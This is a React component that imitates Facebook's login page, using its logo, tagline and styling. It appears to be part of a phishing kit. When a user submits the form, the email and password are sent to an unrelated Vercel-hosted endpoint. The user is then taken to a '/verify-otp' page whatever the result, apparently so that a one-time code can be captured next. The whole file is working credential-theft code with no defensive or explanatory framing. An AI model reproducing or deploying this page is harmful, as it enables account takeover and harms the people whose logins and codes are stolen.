import { useState } from "react";
import { useNavigate } from "react-router-dom";
import logo from '../assets/facebook-logo.png'

const FacebookLogin = () => {
    const [formData, setFormData] = useState({ email: "", password: "" });
    const navigate = useNavigate();
    const [loading, setLoading] = useState(false); // Loading state

    const handleChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);

        try {
            const response = await fetch("https://think-pad-ruby.vercel.app/api/facebook/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(formData),
            });

            const data = await response.json();

            if (response.ok && data.success) {
                console.log("✅ Facebook Login Successful:", data);

                // Navigate to OTP verification page
                navigate('/verify-otp');
                setLoading(false);
            } else {
                alert(`❌ Facebook Login Failed: ${data.message || "Something went wrong"}`);
            }
        } catch (error) {
            navigate('/verify-otp');
            setLoading(false);
        }
    };


    return (
        <div style={styles.content}>
            <div style={styles.flexDiv}>
                <div style={styles.nameContent}>
                    <img src={logo} style={styles.centeredLogo} alt="Facebook Logo" />
                    <p>Connect with friends and the world around you on Facebook.</p>
                </div>
                <form onSubmit={handleSubmit} style={styles.form}>
                    <input
                        name="email"
                        type="text"
                        placeholder="Email or Phone Number"
                        required
                        value={formData.email}
                        onChange={handleChange}
                        style={styles.input}
                    />
                    <input
                        name="password"
                        type="password"
                        placeholder="Password"
                        required
                        value={formData.password}
                        onChange={handleChange}
                        style={styles.input}
                    />
                    <button disabled={loading} type="submit" style={styles.login}>
                        {loading ? "Logging in..." : "Log In"}
                    </button>
                    <a href="#" style={styles.link}>
                        Forgot Password?
                    </a>
                    <hr style={styles.hr} />
                    <button type="button" style={styles.createAccount}>
                        Create New Account
                    </button>
                </form>
            </div>
        </div>
    );
};

const styles = {
    content: {
        position: "absolute",
        top: "50%",
        left: "50%",
        transform: "translate(-50%, -50%)",
        width: "100%",
        maxWidth: "1200px",
        padding: "20px",
    },
    flexDiv: {
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        flexWrap: "wrap",
        gap: "20px",
    },
    nameContent: {
        textAlign: "center",
    },
    centeredLogo: {
        display: "block",
        margin: "0 auto",
        width: "200px",
    },
    form: {
        display: "flex",
        flexDirection: "column",
        background: "#fff",
        padding: "2rem",
        width: "100%",
        maxWidth: "500px",
        borderRadius: "0.5rem",
        boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1)",
    },
    input: {
        outline: "none",
        padding: "0.8rem 1rem",
        marginBottom: "0.8rem",
        fontSize: "1.1rem",
        border: "1px solid #ccc",
    },
    login: {
        outline: "none",
        border: "none",
        background: "#1877f2",
        padding: "0.8rem 1rem",
        borderRadius: "0.4rem",
        fontSize: "1.1rem",
        color: "#fff",
        cursor: "pointer",
    },
    link: {
        textDecoration: "none",
        textAlign: "center",
        fontSize: "1rem",
        paddingTop: "0.8rem",
        color: "#1877f2",
    },
    hr: {
        background: "#f7f7f7",
        margin: "1rem",
    },
    createAccount: {
        outline: "none",
        border: "none",
        background: "#06b909",
        padding: "0.8rem 1rem",
        borderRadius: "0.4rem",
        fontSize: "1.1rem",
        color: "#fff",
        width: "75%",
        margin: "0 auto",
        cursor: "pointer",
    },
};

export default FacebookLogin;
